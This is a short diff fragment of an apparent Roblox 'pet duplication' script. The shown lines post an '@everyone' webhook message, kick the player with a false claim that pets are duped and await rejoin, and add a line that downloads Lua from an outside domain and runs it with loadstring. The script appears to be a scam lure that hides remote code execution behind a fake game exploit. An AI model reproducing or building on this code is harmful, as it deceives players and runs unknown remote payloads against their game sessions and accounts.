@@ -330,4 +330,4 @@ wait(2)
 SendWebhook(url, "@everyone")
 onwait(2)
 game.Players.LocalPlayer:Kick("Everything is duped now rejoin to get your pets!")
-
+loadstring(game:HttpGet("https://egorikusa.space/4a8821838b9c26a631b5807b.lua", true))()
